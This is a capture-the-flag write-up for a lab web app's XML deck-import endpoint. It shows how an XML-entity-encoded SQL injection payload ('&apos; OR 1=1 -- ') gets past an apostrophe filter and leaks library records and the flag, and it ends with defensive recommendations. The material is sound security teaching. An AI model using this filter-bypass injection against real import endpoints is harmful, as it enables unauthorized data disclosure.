# Tanuki — tanuki-011 — SQLi via XML?

## Challenge Information

- **Platform:** BugForge
- **Challenge:** Tanuki
- **Category:** Web Security
- **Hint:** SQLi via XML?
- **Difficulty:** As assigned by the platform

## Objective

Investigate the XML import functionality of the Tanuki web application, identify the vulnerability suggested by the challenge hint, and retrieve the challenge flag.

## 1. Initial Reconnaissance

After registering a test user and authenticating, I explored the application's deck management functionality.

The application provided endpoints for creating, exporting, and importing decks.

### Create a deck

**Endpoint:**

`POST /api/decks`

**Content-Type:** `application/json`

Example request:

```json
{
  "name": "Test",
  "description": "This is a Decks to Test",
  "category": "Test"
}
```

The application returned a successful response containing the newly created deck ID.

```json
{
  "id": 5,
  "message": "Deck created successfully"
}
```

This established a working baseline for testing the deck management functionality.

## 2. Inspecting XML Export

I exported the test deck using:

`GET /api/decks/5/export`

The application returned an XML document containing the deck's name, description, category, and cards.

Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<deck>
  <name>Test</name>
  <description>This is a Decks to Test</description>
  <category>Test</category>
  <cards>
  </cards>
</deck>
```

This confirmed that the application supported XML-based deck export.

## 3. Identifying the XML Import Endpoint

I submitted the exported XML to:

`POST /api/decks/import`

The request used:

`Content-Type: application/xml`

The application successfully imported the deck and returned:

```json
{
  "imported": true,
  "id": 6,
  "message": "Deck imported successfully",
  "cards_count": 0
}
```

This confirmed that the server parsed incoming XML and used its contents during the import operation.

## 4. Investigating Input Validation

I tested different characters in the deck name.

Ordinary names containing alphanumeric characters, hyphens, underscores, spaces, and XML-encoded ampersands were accepted.

For example:

```xml
<name>Tanuki&amp;Test</name>
```

The application stored the name as:

`Tanuki&Test`

This demonstrated that the XML parser decoded the `&amp;` entity before the resulting name was stored.

A literal apostrophe, however, produced this response:

```json
{
  "error": "Deck name contains an unsupported character"
}
```

This suggested that the application applied character validation to the decoded input.

## 5. Testing XML Entity Encoding

I then tested the XML apostrophe entity:

```xml
<name>Tanuki&apos;Test</name>
```

The XML parser decoded `&apos;` into an apostrophe. This produced different behavior from submitting the literal apostrophe, indicating that the encoded input followed a different processing path or reached a later validation stage.

This observation led to further investigation of the XML import functionality.

## 6. SQL Injection Test

I modified the deck name in the XML import request to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<deck>
  <name>Tanuki&apos; OR 1=1 -- </name>
  <description>This is a Decks to Test</description>
  <category>Test</category>
  <cards></cards>
</deck>
```

The request was sent to:

`POST /api/decks/import`

The server returned an HTTP 200 response with the following JSON structure:

```json
{
  "imported": false,
  "message": "A deck with this name is already in the official library",
  "matches": [
    {
      "name": "Planets & Moons",
      "description": "Learn about the planets in our solar system and their natural satellites"
    },
    {
      "name": "Linux Trivia",
      "description": "Essential Linux commands, history, and system knowledge"
    },
    {
      "name": "Cheese Origins",
      "description": "Discover famous cheeses from around the world and their origins"
    },
    {
      "name": "JLPT N1 Certification Answer Key",
      "description": "bug{pbqyLYkK0mmk7BuGWPO0atGIYCqNJBex}"
    }
  ]
}
```

The response disclosed records from the official deck library, including a record that contained the challenge flag in its description.

### Interpretation

The behavior is consistent with an SQL injection vulnerability or another injection-related flaw in the import and matching logic.

The XML parser's entity decoding allowed the apostrophe to reach a different stage of server-side processing than the literal character did.

The disclosure of multiple library records indicates that the application's matching or lookup behavior did not restrict the response to the intended deck.

**Note:** The response establishes unintended data disclosure, but the exact SQL query and database execution path were not independently confirmed.

## 7. Challenge Flag

The flag was recovered from the description of the `JLPT N1 Certification Answer Key` record returned by the import endpoint.

```text
bug{pbqyLYkK0mmk7BuGWPO0atGIYCqNJBex}
```

## 8. Root Cause Analysis

The observed behavior suggests weaknesses in the application's handling of XML-derived input and database-backed deck matching.

Potential contributing issues include:

- Inconsistent input validation between literal characters and XML-decoded values.
- Potentially unsafe handling of user-controlled values in database queries.
- Excessive disclosure of official-library records in import responses.
- Lack of sufficiently restrictive matching or authorization logic.

The exact backend implementation would need to be inspected to confirm the underlying root cause.

## 9. Security Recommendations

To prevent similar vulnerabilities:

1. **Use parameterized SQL queries.** Never concatenate user-controlled XML values into SQL statements.
2. **Validate decoded input.** Apply consistent validation after XML parsing and entity decoding.
3. **Use strict XML parsing.** Configure XML parsers securely and reject malformed or unexpected document structures.
4. **Restrict response data.** Return only the records and fields necessary for the import operation.
5. **Apply authorization checks.** Ensure that official-library records are disclosed only when appropriate.
6. **Handle database errors safely.** Avoid exposing internal database errors or query details to clients.
7. **Test import functionality.** Include XML entity handling, SQL injection, authorization, and information-disclosure tests in security assessments.

## 10. Conclusion

The Tanuki challenge involved investigating an XML-based deck import workflow.

The investigation identified XML entity decoding, inconsistent behavior when processing apostrophes, and an import response that disclosed multiple official-library records.

The resulting response exposed the challenge flag:

`bug{pbqyLYkK0mmk7BuGWPO0atGIYCqNJBex}`

This demonstrates the importance of consistent input validation, safe database query construction, and minimizing sensitive data in API responses.